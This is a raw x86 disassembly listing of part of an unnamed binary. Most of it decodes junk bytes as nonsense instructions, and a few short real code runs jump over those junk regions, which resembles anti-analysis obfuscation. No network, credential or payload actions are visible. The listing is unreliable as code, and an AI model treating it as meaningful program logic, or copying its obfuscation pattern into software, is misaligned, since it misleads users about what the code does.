  4146e4:	or     BYTE PTR [ecx+0x18],cl
  4146e7:	inc    esp
  4146e8:	push   edi
  4146e9:	mov    edx,edx
  4146eb:	ins    DWORD PTR es:[edi],dx
  4146ec:	outs   dx,BYTE PTR ds:[esi]
  4146ed:	or     al,dl
  4146ef:	fmul   DWORD PTR [ecx-0x20baf33f]
  4146f5:	scas   al,BYTE PTR es:[edi]
  4146f6:	arpl   WORD PTR [esi-0x7f],sp
  4146f9:	dec    edx
  4146fa:	add    DWORD PTR [ebp+0x435f6828],ecx
  414700:	inc    ecx
  414701:	nop
  414702:	lea    ebx,[ebp+0x71]
  414705:	rcl    BYTE PTR [ebx-0x7a4e0dab],1
  41470b:	(bad)  
  41470d:	dec    edx
  41470e:	add    ah,BYTE PTR [eax-0x1643a9d4]
  414714:	repnz sti 
  414716:	loopne 0x41476e
  414718:	or     BYTE PTR ds:0x55671817,bl
  41471e:	in     al,0x6c
  414720:	cmc    
  414721:	in     al,dx
  414722:	xchg   DWORD PTR [edi+0x64],ebx
  414725:	call   0x5d8b:0x10558bd1
  41472c:	adc    al,0x33
  41472e:	fisttp DWORD PTR [ebx]
  414730:	retf   
  414731:	add    eax,ecx
  414733:	lea    eax,[ebp+eax*4-0x7c]
  414737:	push   eax
  414738:	shl    edx,0x1e
  41473b:	call   0x411c08
  414740:	mov    eax,DWORD PTR [ebp-0x80]
  414743:	mov    ecx,DWORD PTR [ebp-0x80]
  414746:	xor    eax,edi
  414748:	xor    ecx,0xfffffffe
  41474b:	shr    eax,0x2
  41474e:	shl    ecx,0x1e
  414751:	or     ecx,eax
  414753:	mov    DWORD PTR [ebp-0x80],ecx
  414756:	lea    eax,[ebp-0x80]
  414759:	push   eax
  41475a:	mov    eax,DWORD PTR [ebp+0x10]
  41475d:	mov    ecx,DWORD PTR [ebp+0x14]
  414760:	shrd   eax,ecx,0x2
  414764:	shr    ecx,0x2
  414767:	mov    ecx,DWORD PTR [ebp+0x10]
  41476a:	mov    edx,DWORD PTR [ebp+0x14]
  41476d:	xor    eax,esi
  41476f:	xor    edx,edx
  414771:	or     eax,edx
  414773:	push   eax
  414774:	mov    eax,ds:0x422738
  414779:	mov    edi,0x42267e
  41477e:	push   edi
  41477f:	push   DWORD PTR [eax]
  414781:	shl    ecx,0x1e
  414784:	call   0x41b447
  414789:	lea    eax,[ebp-0x80]
  41478c:	push   eax
  41478d:	mov    eax,DWORD PTR [ebp+0x10]
  414790:	jmp    0x414ac9
  414795:	pop    ds
  414796:	cmp    eax,0xaf9fd01d
  41479b:	das    
  41479c:	lods   eax,DWORD PTR ds:[esi]
  41479d:	sbb    DWORD PTR [esi+0x47a9a4c7],edi
  4147a3:	or     BYTE PTR [edx-0x41416155],dl
  4147a9:	in     eax,dx
  4147aa:	les    edi,FWORD PTR [esi-0x1c2e5842]
  4147b0:	fadd   QWORD PTR [esi+edi*2+0x136ecad]
  4147b7:	mov    ecx,0xd97bbe21
  4147bc:	jle    0x414786
  4147be:	aad    0x24
  4147c0:	test   cl,dl
  4147c2:	lahf   
  4147c3:	cmp    dh,BYTE PTR [ebx+0x2dfc66d7]
  4147c9:	sub    BYTE PTR [edx+0x19],ch
  4147cc:	inc    edi
  4147cd:	push   eax
  4147ce:	jno    0x4147da
  4147d0:	sub    DWORD PTR [edi],ebp
  4147d2:	push   eax
  4147d3:	xor    eax,DWORD PTR [edx+0x77]
  4147d6:	jmp    0x4147b4
  4147d8:	adc    dh,BYTE PTR [esi]
  4147da:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  4147db:	inc    ecx
  4147dc:	fld    QWORD PTR [bx+di]
  4147df:	pop    ecx
  4147e0:	das    
  4147e1:	push   edi
  4147e2:	jg     0x4147bd
  4147e4:	scas   al,BYTE PTR es:[edi]
  4147e5:	dec    ecx
  4147e6:	push   esi
  4147e7:	loope  0x414833
  4147e9:	lahf   
  4147ea:	or     eax,0x929161e5
  4147ef:	test   eax,0x7faf946a
  4147f4:	pop    edi
  4147f5:	mov    bl,0x29
  4147f7:	sub    edx,DWORD PTR [ecx]
  4147f9:	add    BYTE PTR [eax],cl
  4147fb:	jmp    0x9b5a2a7c
  414800:	ret    0xef6f
  414803:	or     dl,bh
  414805:	repz test al,0x24
  414808:	daa    
  414809:	jp     0x41484c
  41480b:	shl    BYTE PTR [esi],cl
  41480d:	mov    al,0xdc
  41480f:	test   ebp,edi
  414811:	pop    esi
  414812:	adc    DWORD PTR [edx+0x18],0xffffff92
  414816:	adc    edi,ebx
  414818:	mov    edx,0x317365c6
  41481d:	push   0x4ad1bd14
  414822:	adc    dl,BYTE PTR [eax+0x18]
  414825:	pop    esi
  414826:	and    al,0xe4
  414828:	cdq    
  414829:	xchg   ecx,eax
  41482a:	mov    dh,0x91
  41482c:	sbb    DWORD PTR [ecx+0x31510acc],ecx
  414832:	sub    bh,BYTE PTR [eax+0x79d33a21]
  414838:	ja     0x41486f
  41483a:	test   al,0xf3
  41483c:	jle    0x41487a
  41483e:	xlat   BYTE PTR ds:[ebx]
  41483f:	cmp    al,0x31
  414841:	or     BYTE PTR [edx+0x10],0xb4
  414845:	in     eax,dx
  414846:	mov    cl,0xba
  414848:	lds    ecx,FWORD PTR [ebx+0x62a69521]
  41484e:	xchg   edx,eax
  41484f:	jmp    0x4148b9
  414851:	fsub   DWORD PTR [ecx-0x18]
  414854:	xchg   edx,eax
  414855:	iret   
  414856:	mov    bh,0xb2
  414858:	or     al,0xea
  41485a:	adc    al,0x31
  41485c:	push   esi
  41485d:	(bad)  
  41485e:	test   DWORD PTR [edx+esi*4-0x39bef340],0xf9e7e25e
  414869:	outs   dx,DWORD PTR ds:[esi]
  41486a:	sbb    eax,0x88460e4d
  41486f:	sub    al,0xd7
  414871:	push   ds
  414872:	push   ebp
  414873:	aam    0x6c
  414875:	or     edi,DWORD PTR [ebx+eax*4]
  414878:	or     BYTE PTR [esi+0x1c],cl
  41487b:	add    DWORD PTR [ebx-0x79e05795],ecx
  414881:	jmp    0x7712:0x78fc6e6c
  414888:	mov    DWORD PTR [edi-0x61],edi
  41488b:	int    0x89
  41488d:	pand   mm6,QWORD PTR [esi-0x20]
  414891:	adc    eax,0x96cf9589
  414896:	jnp    0x4148f2
  414898:	sbb    edi,DWORD PTR [ebx-0x62]
  41489b:	jb     0x4148eb
  41489d:	aad    0x9e
  41489f:	jp     0x4148c5
  4148a1:	nop
  4148a2:	push   0x65f9403b
  4148a7:	add    BYTE PTR [ebx+0x7c],cl
  4148aa:	cli    
  4148ab:	xor    eax,0xa7f7c606
  4148b0:	js     0x414876
  4148b2:	inc    edx
  4148b3:	sub    BYTE PTR [ebx+ebp*8-0x80],dh
  4148b7:	fstp   st(1)
  4148b9:	cdq    
  4148ba:	daa    
  4148bb:	adc    DWORD PTR [ecx+0x3d],ecx
  4148be:	adc    BYTE PTR [esi-0x52580801],bl
  4148c4:	inc    ebp
  4148c5:	(bad)  [edi-0x3e]
  4148c8:	mov    edx,0x6eb7369c
  4148cd:	int3   
  4148ce:	cmp    ch,BYTE PTR [esi+0x5abffd4c]
  4148d4:	push   edx
  4148d5:	push   esi
  4148d6:	xor    dh,0x42
  4148d9:	call   0x70ba:0x5a9d535a
  4148e0:	sahf   
  4148e1:	(bad)  
  4148e2:	dec    esp
  4148e3:	mov    ecx,0x9a79960d
  4148e8:	fiadd  DWORD PTR [eax]
  4148ea:	out    dx,al
  4148eb:	aad    0x10
  4148ed:	(bad)  
  4148ee:	fs daa 
  4148f0:	gs dec ebp
  4148f2:	ret    0x1b4c
  4148f5:	xor    dl,bh
  4148f7:	sub    BYTE PTR [ecx-0x53],cl
  4148fa:	push   eax
  4148fb:	xor    eax,0xd0709e3a
  414900:	sub    DWORD PTR [edi-0x7e],ebx
  414903:	cdq    
  414904:	push   ss
  414905:	dec    edx
  414906:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  414907:	in     al,dx
  414908:	fs pop ecx
  41490a:	test   BYTE PTR [edx+ecx*2-0x13a03302],cl
  414911:	xchg   esp,eax
  414912:	pop    ebp
  414913:	pop    ecx
  414914:	daa    
  414915:	mov    ds:0xd07b426f,al
  41491a:	stos   BYTE PTR es:[edi],al
  41491b:	mov    eax,0x824d7ac4
  414920:	jmp    0xd655:0x5e96b21d
  414927:	dec    ecx
  414928:	idiv   DWORD PTR [ebx]
  41492a:	pushf  
  41492b:	or     al,0x1f
  41492d:	fimul  WORD PTR [edi+eiz*8-0xb]
  414931:	mov    dl,0x33
  414933:	dec    edx
  414934:	add    eax,0x85a8f082
  414939:	sub    DWORD PTR [edi],ebp
  41493b:	mov    ds:0x92c5d124,al
  414940:	jmp    0x4148d5
  414942:	push   0xa4a40bad
  414947:	jnp    0x4149a0
  414949:	lss    ebp,FWORD PTR [ebx+esi*8-0x307549f1]
  414951:	push   edi
  414952:	jnp    0x4148e3
  414954:	xor    DWORD PTR [eax-0x62],0x44805490
  41495b:	xchg   edi,eax
  41495c:	or     bl,BYTE PTR [esp+ebp*1]
  41495f:	ins    DWORD PTR es:[edi],dx
  414960:	sub    ch,BYTE PTR [esi+0x78]
  414963:	out    dx,eax
  414964:	jne    0x4149a6
  414966:	mov    BYTE PTR [ebp+ebp*1+0x43],dh
  41496a:	(bad)  
  41496b:	mov    ds:0xf4c5e5b3,al
  414970:	imul   BYTE PTR [esi]
  414972:	cmp    bl,0x83
  414975:	sub    bl,al
  414977:	mov    bh,0x9a
  414979:	sub    eax,0x8e0f7077
  41497e:	and    BYTE PTR [edx+0x40],ah
  414981:	retf   
  414982:	nop
  414983:	ficomp WORD PTR [edi+ecx*4]
  414986:	and    BYTE PTR [esi+0x1a],bh
  414989:	mov    ch,0xa
  41498b:	jne    0x414939
  41498d:	in     al,0x7c
  41498f:	je     0x41498c
  414991:	xor    eax,0x4ce2ffda
  414996:	push   ebx
  414997:	fimul  DWORD PTR [esp+esi*4-0x59]
  41499b:	cmp    BYTE PTR [edi],bh
  41499d:	lods   eax,DWORD PTR ds:[esi]
  41499e:	ja     0x414997
  4149a0:	and    edi,eax
  4149a2:	push   esp
  4149a3:	(bad)  
  4149a4:	fs pop ds
  4149a6:	mov    eax,0xdc87eac5
  4149ab:	xchg   ecx,eax
  4149ac:	out    0xe,al
  4149ae:	jno    0x4149d2
  4149b0:	out    dx,eax
  4149b1:	sub    eax,0xe0b84933
  4149b6:	mov    al,ds:0xab68a2e1
  4149bb:	xchg   DWORD PTR [ebx-0x36e957fd],esp
  4149c1:	sub    eax,0x693f7bd
  4149c6:	pop    ecx
  4149c7:	data16 das 
  4149c9:	push   0x772915db
  4149ce:	mov    al,ds:0x301fa0b
  4149d3:	jmp    0x7c70e6b2
  4149d8:	fdivrp st(7),st
  4149da:	add    ebp,DWORD PTR [ecx]
  4149dc:	mov    eax,0x7cb22977
  4149e1:	jg     0x414a03
  4149e3:	mov    BYTE PTR [eax],al
  4149e5:	cmp    eax,0xd2269171
  4149ea:	call   0x7e1f:0xe634ce6e
  4149f1:	imul   ebx,edi,0x2
  4149f4:	xor    DWORD PTR [eax],edi
  4149f6:	lods   eax,DWORD PTR ds:[esi]
  4149f8:	push   0x33be11fb
  4149fd:	jle    0x414997
  4149ff:	xchg   ebx,eax
  414a00:	xor    DWORD PTR [ebp+0x2a],edx
  414a03:	das    
  414a04:	gs ret 
  414a06:	es loop 0x414a4c
  414a09:	shr    BYTE PTR [edx],cl
  414a0b:	push   esi
  414a0c:	pop    edi
  414a0d:	repnz adc esi,eax
  414a10:	aam    0xa0
  414a12:	and    DWORD PTR ds:[ebp+0x12],esp
  414a16:	test   ch,dh
  414a18:	push   ss
  414a19:	loop   0x414a13
  414a1b:	cmp    ah,BYTE PTR [edi+0x17]
  414a1e:	push   ecx
  414a1f:	loop   0x4149c4
  414a21:	leave  
  414a22:	jmp    0xd152:0xe147b733
  414a29:	sbb    DWORD PTR [ebp-0x29b8b8d6],0xffffffb2
  414a30:	push   DWORD PTR [edi]
  414a32:	fcmovnu st,st(7)
  414a34:	(bad)  
  414a35:	call   0x921c:0x936c5e47
  414a3c:	jbe    0x414a4e
  414a3e:	ja     0x414ab6
  414a40:	ficomp WORD PTR [eax+0x4dff687a]
  414a46:	xor    BYTE PTR [esp+eiz*4],dl
  414a49:	push   esp
  414a4a:	dec    ebp
  414a4b:	mov    bl,0x19
  414a4d:	aam    0xe1
  414a4f:	adc    BYTE PTR [edi-0x408c23eb],ch
  414a55:	dec    esi
  414a56:	(bad)  
  414a57:	std    
  414a58:	jmp    0x414ab2
  414a5a:	pop    esi
  414a5b:	das    
  414a5c:	hlt    
  414a5d:	outs   dx,DWORD PTR ds:[esi]
  414a5e:	adc    al,0x72
  414a60:	jnp    0x414a61
  414a62:	outs   dx,DWORD PTR ds:[esi]
  414a63:	pop    es
  414a64:	nop
  414a65:	and    eax,0x26966547
  414a6a:	dec    ebx
  414a6b:	jae    0x414a17
  414a6d:	int    0x99
  414a6f:	push   ebp
  414a70:	inc    ebp
  414a71:	loope  0x414af2
  414a73:	inc    ebx
  414a74:	add    BYTE PTR [ecx-0x66],0x9e
  414a78:	aas    
  414a79:	and    eax,0xbfae7f9c
  414a7e:	bound  ebp,QWORD PTR [edi-0x11033341]
  414a84:	in     eax,dx
  414a85:	enter  0xbb2,0x97
  414a89:	or     BYTE PTR [eax],ch
  414a8b:	and    dh,bl
  414a8d:	xor    dl,BYTE PTR [ecx-0x59]
  414a90:	cmp    eax,0x215e8ed3
  414a95:	(bad)  
  414a96:	mov    ebx,0xe44b6a73
  414a9b:	data16 mov al,cl
  414a9e:	jmp    0xeafe2a90
  414aa3:	ds int3 
  414aa5:	jb     0x414b1b
  414aa7:	jb     0x414ace
  414aa9:	push   cs
  414aaa:	cmp    al,0xa0
  414aac:	jmp    0x414ac5
  414aae:	cmp    cl,dh
  414ab0:	cli    
  414ab1:	sahf   
  414ab2:	pushf  
  414ab3:	push   0x1f72259d
  414ab8:	jne    0x414a44
  414aba:	outs   dx,DWORD PTR ds:[esi]
  414abb:	das    
  414abc:	loopne 0x414b19
  414abe:	or     al,0x3c
  414ac0:	cs daa 
  414ac2:	add    BYTE PTR [esi+0xbfd1a9a],bh
  414ac8:	stc    
  414ac9:	mov    ecx,DWORD PTR [ebp+0x14]
  414acc:	shrd   eax,ecx,0x2
  414ad0:	shr    ecx,0x2
  414ad3:	mov    ecx,DWORD PTR [ebp+0x10]
  414ad6:	mov    edx,DWORD PTR [ebp+0x14]
  414ad9:	xor    eax,esi
  414adb:	xor    edx,edx
  414add:	or     eax,edx
  414adf:	push   eax
  414ae0:	mov    eax,ds:0x422738
  414ae5:	push   edi
  414ae6:	push   DWORD PTR [eax]
  414ae8:	shl    ecx,0x1e
  414aeb:	call   0x41b447
  414af0:	mov    eax,DWORD PTR [ebp-0x3c]
  414af3:	mov    eax,DWORD PTR [ebp-0x2c]
  414af6:	mov    edi,DWORD PTR [ebp-0x24]
  414af9:	mov    eax,DWORD PTR [ebp-0x30]
  414afc:	mov    ecx,edi
  414afe:	mov    DWORD PTR [ebp-0x1c],eax
  414b01:	rol    ecx,0x2
  414b04:	mov    eax,0xa5069bae
  414b09:	xor    ecx,eax
  414b0b:	jmp    0x414e44
  414b10:	fisttp WORD PTR [eax+0x5aac5a8c]
  414b16:	xor    BYTE PTR [esp+edx*1-0x7361eb44],bh
  414b1d:	mov    ecx,edx
  414b1f:	nop
  414b20:	(bad)  [esi+edi*4-0x413b1242]
  414b27:	mov    esi,0xc41bc61f
  414b2c:	retf   
  414b2d:	repz xchg ebx,eax
  414b2f:	xchg   ebp,eax
  414b30:	sar    BYTE PTR [edi+0x7c702d01],cl
  414b36:	dec    esp
  414b37:	xor    eax,0xa28f1792
  414b3c:	add    al,0x3
  414b3e:	push   eax
  414b3f:	mov    esi,0xbd2ddb7a
  414b44:	pop    esi
  414b45:	repnz cwde 
  414b47:	clc    
  414b48:	ret    
  414b49:	lds    esp,FWORD PTR [ebx+ebp*8+0x56a9a62a]
  414b50:	shl    ah,0x1a
  414b53:	cmp    eax,0x692891e
  414b58:	xchg   DWORD PTR [edx+ecx*4+0x55b7b01f],edi
  414b5f:	sub    DWORD PTR [eax+0x75],eax
  414b62:	lods   eax,DWORD PTR ds:[esi]
  414b63:	mul    al
  414b65:	js     0x414ba3
  414b67:	ds push cs
  414b69:	dec    edx
  414b6a:	cmp    al,0x5a
  414b6c:	sub    eax,0x166ef8ca
  414b71:	mov    BYTE PTR [esi],ah
  414b73:	push   0xd3f82241
  414b78:	in     eax,0x67
  414b7a:	(bad)  
  414b7b:	test   DWORD PTR [edi-0x3a],esp
  414b7e:	mov    eax,0xbb490cf5
  414b83:	retf   
  414b84:	sahf   
  414b85:	shr    BYTE PTR [eax+ebp*2+0x47c6b783],cl
  414b8c:	mov    ds:0x324b6f7c,al
  414b91:	inc    edx
  414b92:	(bad)  [edx]
  414b94:	xchg   edx,eax
  414b95:	repz add esp,DWORD PTR [bp+di]
  414b99:	enter  0x4937,0x7c
  414b9d:	ror    BYTE PTR [ebx+0x318a3a49],0x34
  414ba4:	icebp  
  414ba5:	cmc    
  414ba6:	push   0x8cc21529
  414bab:	les    ecx,FWORD PTR [ebx+edi*2]
  414bae:	dec    edi
  414baf:	mov    ebx,0x28e95aeb
  414bb4:	xchg   ebx,eax
  414bb5:	mov    ds:0x83ddc702,al
  414bba:	imul   eax,DWORD PTR [edi],0xffffffb5
  414bbd:	sbb    DWORD PTR [ecx+0x57],ecx
  414bc0:	mov    ch,0xbc
  414bc2:	push   cs
  414bc3:	xchg   esp,eax
  414bc4:	push   eax
  414bc5:	into   
  414bc6:	push   edx
  414bc7:	or     al,0x1e
  414bc9:	xor    al,0x9b
  414bcb:	fs pushf 
  414bcd:	push   cs
  414bce:	xchg   edi,eax
  414bcf:	and    DWORD PTR [esi-0x635158fd],ebx
  414bd5:	lods   eax,DWORD PTR ds:[esi]
  414bd6:	inc    esp
  414bd7:	loop   0x414b80
  414bd9:	inc    esp
  414bda:	push   edi
  414bdb:	cmp    esi,DWORD PTR [esi-0x15e7257b]
  414be1:	jbe    0x414b84
  414be3:	mov    cl,0x2b
  414be5:	(bad)  
  414be6:	mov    ecx,0x44a3086a
  414beb:	push   ebp
  414bec:	call   FWORD PTR [esi-0x3b]
  414bef:	test   DWORD PTR [ecx+0x2f],0xd6717bdf
  414bf6:	mov    ebx,edi
  414bf8:	shl    BYTE PTR [edi-0x4c],cl
  414bfb:	cmc    
  414bfc:	jnp    0x414bba
  414bfe:	leave  
  414bff:	stos   DWORD PTR es:[edi],eax
  414c00:	into   
  414c01:	or     DWORD PTR [ebx],edx
  414c03:	fdivr  st(3),st
  414c05:	or     BYTE PTR [ecx+ebp*2+0x5b7202e9],cl
  414c0c:	inc    edx
  414c0d:	dec    esi
  414c0e:	cmp    bl,dl
  414c10:	mov    dh,0xa1
  414c12:	ds push edi
  414c14:	xchg   ebp,eax
  414c15:	xor    bh,BYTE PTR [bx+0x45]
  414c19:	mov    ebx,0x9210027c
  414c1e:	cmp    bh,ah
  414c20:	scas   eax,DWORD PTR es:[edi]
  414c21:	scas   eax,DWORD PTR es:[edi]
  414c22:	or     ch,BYTE PTR [ebx]
  414c24:	push   ds
  414c25:	add    eax,0xe4b43cf
  414c2a:	cmp    al,0xb
  414c2c:	stc    
  414c2d:	int3   
  414c2e:	fsubr  DWORD PTR [ebx]
  414c30:	sbb    eax,0x4ebec0db
  414c35:	push   ecx
  414c36:	and    eax,0x8d79ea34
  414c3b:	pop    edi
  414c3c:	sub    ecx,DWORD PTR [eax+eiz*2+0x22]
  414c40:	inc    edi
  414c41:	xor    BYTE PTR [ecx],0xd6
  414c44:	xchg   ebx,eax
  414c45:	mov    bh,0x43
  414c47:	test   al,0x88
  414c49:	nop
  414c4a:	cli    
  414c4b:	dec    edx
  414c4c:	fld    QWORD PTR [edi-0x2ee31dec]
  414c52:	push   esp
  414c53:	jb     0x414bda
  414c55:	pop    esi
  414c56:	inc    edi
  414c57:	fist   WORD PTR [ebx+0x26]
  414c5a:	out    0x8e,eax
  414c5c:	jl     0x414c31
  414c5e:	cmc    
  414c5f:	jae    0x414c85
  414c61:	aam    0x8f
  414c63:	dec    esi
  414c64:	mov    al,0x5f
  414c66:	imul   esi,eax,0xffffff83
  414c69:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  414c6a:	or     BYTE PTR [esi+0x44],dh
  414c6d:	add    DWORD PTR [ecx-0x53],ecx
  414c70:	gs cld 
  414c72:	and    BYTE PTR [edx+0x5c],ah
  414c75:	clc    
  414c76:	mov    edi,esi
  414c78:	jp     0x414c57
  414c7a:	mov    cl,BYTE PTR [eax]
  414c7c:	js     0x414c6a
  414c7e:	aam    0x0
  414c80:	mov    eax,0xbaaeddd4
  414c85:	lock enter 0xd1c,0xc5
  414c8a:	push   ss
  414c8b:	push   ecx
  414c8c:	adc    BYTE PTR [ecx+edx*2+0x7],0x28
  414c91:	jb     0x414c51
  414c93:	pop    esp
  414c94:	jp     0x414c37
  414c96:	dec    ebx
  414c97:	mov    ds:0x1589e8e3,al
  414c9c:	sti    
  414c9d:	mov    ds:0x6f9c6f01,al
  414ca2:	les    edx,FWORD PTR [edx]
  414ca4:	xlat   BYTE PTR ds:[ebx]
  414ca5:	adc    ebp,DWORD PTR [eax]
  414ca7:	icebp  
  414ca8:	mov    esi,0x82e193fc
  414cad:	or     DWORD PTR [ebp-0x19a00a59],eax
  414cb3:	cmc    
  414cb4:	jge    0x414cc6
  414cb6:	test   al,0xf5
  414cb8:	sub    bh,ch
  414cba:	or     al,0x2b
  414cbc:	sub    cl,bl
  414cbe:	xchg   ebp,eax
  414cbf:	out    0x35,eax
  414cc1:	pusha  
  414cc2:	mov    eax,0x1af0015
  414cc7:	xor    ecx,DWORD PTR fs:[esi-0x31]
  414ccb:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  414ccc:	pop    ebp
  414ccd:	inc    ecx
  414cce:	in     eax,0xf2
  414cd0:	test   BYTE PTR [esi],ch
  414cd2:	jle    0x414ce6
  414cd4:	fidiv  WORD PTR [ecx+0x63]
  414cd7:	sbb    al,0xbd
  414cd9:	fnstcw WORD PTR ss:[edx+0x2796d19]
  414ce0:	or     BYTE PTR [edi-0x78fb41b4],al
  414ce6:	test   al,al
  414ce8:	dec    ecx
  414ce9:	cmp    eax,0xf5a30bab
  414cee:	loop   0x414d2d
  414cf0:	push   esp
  414cf1:	pop    ecx
  414cf2:	mov    ecx,0x75ddfa79
  414cf7:	mov    WORD PTR [edx-0x55],es
  414cfa:	push   ecx
  414cfb:	hlt    
  414cfc:	mov    cl,0x3d
  414cfe:	jno    0x414d63
  414d00:	push   cs
  414d01:	fwait
  414d02:	loopne 0x414cfc
  414d04:	add    al,0xb
  414d06:	test   eax,0x7b48cb7d
  414d0b:	fwait
  414d0c:	pop    ds
  414d0d:	xor    BYTE PTR [ebx-0x36],ah
  414d10:	lods   al,BYTE PTR ds:[esi]
  414d11:	inc    esp
  414d12:	lea    esp,[ebx]
  414d14:	push   ebx
  414d15:	push   cs
  414d16:	add    ah,cl
  414d18:	adc    ah,BYTE PTR fs:[ebp+0x6]
  414d1c:	ja     0x414d28
  414d1e:	aaa    
  414d1f:	xchg   edi,eax
  414d20:	dec    esp
  414d21:	out    0xf7,eax
  414d23:	jmp    0x472c856a
  414d28:	retf   
  414d29:	mov    esi,0x6409c763
  414d2e:	ja     0x414d85
  414d30:	or     bl,BYTE PTR [edi]
  414d32:	in     al,0x19
  414d34:	shr    DWORD PTR [eax],0xd3
  414d37:	lock or al,0x52
  414d3a:	loop   0x414d8a
  414d3c:	mov    ah,BYTE PTR [esi+0x3ac85a4f]
  414d42:	pop    eax
  414d43:	pop    ss
  414d44:	jge    0x414d51
  414d46:	(bad)  
  414d47:	repnz cdq 
  414d49:	fcomp  QWORD PTR es:[ecx]
  414d4c:	sbb    DWORD PTR ds:0x5c9a0389,esi
  414d52:	mov    ds:0x32d54a90,eax
  414d57:	and    BYTE PTR [edi+0x90f27c1],0xb4
  414d5e:	push   ds
  414d5f:	mov    dl,0xca
  414d61:	rcl    DWORD PTR [ebx],0x93
  414d64:	das    
  414d65:	aaa    
  414d66:	and    al,0xfe
  414d68:	icebp  
  414d69:	xlat   BYTE PTR ds:[ebx]
  414d6a:	dec    esi
  414d6b:	or     esi,DWORD PTR [esi-0x4eb6d8a2]
  414d71:	test   eax,0xfbe81732
  414d76:	dec    esp
  414d77:	rcr    esp,0x1a
  414d7a:	add    BYTE PTR [ebx-0x66],al
  414d7d:	pushw  cs
  414d7f:	imul   ebp,DWORD PTR [ebp+0x87e62bf],0x2f
  414d86:	jbe    0x414d25
  414d88:	sbb    DWORD PTR [esi-0x349d13ca],ecx
  414d8e:	jae    0x414db4
  414d90:	inc    esi
  414d91:	or     DWORD PTR [edi-0x2edf40a3],ebp
  414d97:	in     eax,dx
  414d98:	xor    bl,cl
  414d9a:	imul   ebx,DWORD PTR [esi],0x7170e140
  414da0:	add    DWORD PTR ds:0x98a2f68f,ecx
  414da6:	cdq    
  414da7:	sti    
  414da8:	gs jns 0x414d49
  414dab:	test   al,0x41
  414dad:	push   edi
  414dae:	lods   al,BYTE PTR ds:[esi]
  414daf:	ins    BYTE PTR es:[edi],dx
  414db0:	sbb    al,0xaf
  414db2:	adc    ch,BYTE PTR [esi-0x1dd5f6f0]
  414db8:	and    ecx,DWORD PTR [ebp-0x797723c3]
  414dbe:	sahf   
  414dbf:	hlt    
  414dc0:	xchg   edx,eax
  414dc1:	clc    
  414dc2:	iret   
  414dc3:	adc    dl,BYTE PTR ds:0x6d8a4bda
  414dc9:	and    BYTE PTR ds:0x8ece061a,al
  414dcf:	je     0x414e27
  414dd1:	je     0x414e38
  414dd3:	fdiv   QWORD PTR [eax-0x2b]
  414dd6:	mov    ebp,0xe4cb72ce
  414ddb:	sti    
  414ddc:	xchg   esi,eax
  414ddd:	jle    0x414e0f
  414ddf:	ret    0x2c54
  414de2:	sub    bl,BYTE PTR [esi+ebp*1-0x26]
  414de6:	popf   
  414de7:	or     al,0x87
  414de9:	cs push 0x12
  414dec:	mov    esp,0xb40ee9ac
  414df1:	ds mov esi,0xd828f99b
  414df7:	nop
  414df8:	inc    ebp
  414df9:	inc    esp
  414dfa:	sbb    DWORD PTR [ecx-0x3a],0x68
  414dfe:	sbb    al,0x41
  414e00:	mov    ds:0x38024ecd,al
  414e05:	loopne 0x414ddf
  414e07:	iret   
  414e08:	or     ebp,DWORD PTR [esi-0x170579a5]
  414e0e:	sbb    bh,ah
  414e10:	inc    ecx
  414e11:	rol    BYTE PTR ds:0x8ba84e71,cl
  414e17:	push   ebx
  414e18:	js     0x414e3b
  414e1a:	push   ss
  414e1b:	retf   
  414e1c:	stc    
  414e1d:	lods   al,BYTE PTR ds:[esi]
  414e1e:	xor    al,0xb0
  414e20:	popf   
  414e21:	rcl    BYTE PTR [ebx],cl
  414e23:	int    0x6d
  414e25:	dec    esi
  414e26:	push   cs
  414e27:	popf   
  414e28:	pop    ecx
  414e29:	push   cs
  414e2a:	gs fcomi st,st(0)
  414e2d:	repnz in eax,dx
  414e2f:	and    al,0x1e
  414e31:	loope  0x414e92
  414e33:	mov    ecx,0x3625fffc
  414e38:	ret    0x87b5
  414e3b:	ja     0x414e1a
  414e3d:	loopne 0x414df4
  414e3f:	jl     0x414dd6
  414e41:	push   0xc83b3871
  414e46:	jmp    0x41517f
  414e4b:	call   0xa44dd255
  414e50:	mov    WORD PTR [edi+0x2a],fs
  414e53:	mov    eax,0x799e22a6
  414e58:	and    eax,DWORD PTR [esi]
  414e5a:	xchg   edx,eax
  414e5b:	or     al,0xaa
  414e5d:	mov    esi,0xbec4edbe
  414e62:	mov    esi,0xdce96168
  414e67:	inc    ebp
  414e68:	test   BYTE PTR [esi-0x63],bh
  414e6b:	cwde   
  414e6c:	shr    BYTE PTR [esi+eax*8+0x1be89459],1
  414e73:	cdq    
  414e74:	push   ebx
  414e75:	aaa    
  414e76:	pop    esi
  414e77:	loop   0x414e9c
  414e79:	sbb    al,cl
  414e7b:	sti    
  414e7c:	inc    edx
  414e7d:	out    dx,eax
  414e7e:	dec    ecx
  414e7f:	(bad)
  414e83:	push   es
  414e84:	xor    al,BYTE PTR [ebx]
  414e86:	iret   
  414e87:	and    ch,BYTE PTR [ebx+0x64]
  414e8a:	(bad)  [ebp+0x15]
  414e8d:	xor    al,BYTE PTR [ebx-0x66df2688]
  414e93:	cmp    al,0xed
  414e95:	ins    DWORD PTR es:[edi],dx
  414e96:	pop    eax
  414e97:	add    eax,0x544db78d
  414e9c:	jo     0x414ec5
  414e9e:	mov    esi,ebp
  414ea0:	lock mov esp,0xe2785dda
  414ea6:	xor    al,0x54
  414ea8:	xchg   ebp,eax
  414ea9:	stos   BYTE PTR es:[edi],al
  414eaa:	xor    BYTE PTR [edx-0x32955e94],al
  414eb0:	ins    BYTE PTR es:[edi],dx
  414eb1:	cld    
  414eb2:	pusha  
  414eb3:	push   es
  414eb4:	pop    ecx
  414eb5:	dec    eax
  414eb6:	out    0x53,al
  414eb8:	mov    ch,0x1f
  414eba:	push   ebx
  414ebb:	mov    bh,0x65
  414ebd:	push   ecx
  414ebe:	bound  eax,QWORD PTR [ebp+0x56d5b591]
  414ec4:	inc    edx
  414ec5:	iret   
  414ec6:	test   al,0xb8
  414ec8:	clc    
  414ec9:	gs ja  0x414f38
  414ecc:	and    BYTE PTR [ebx+0x5],dl
  414ecf:	and    dl,BYTE PTR [ebx+0x76e35e5e]
  414ed5:	mul    BYTE PTR [edx]
  414ed7:	adc    BYTE PTR [ebp+0x52],dh
  414eda:	retf   
  414edb:	pusha  
  414edc:	push   edi
  414edd:	fistp  QWORD PTR [edi-0x22977289]
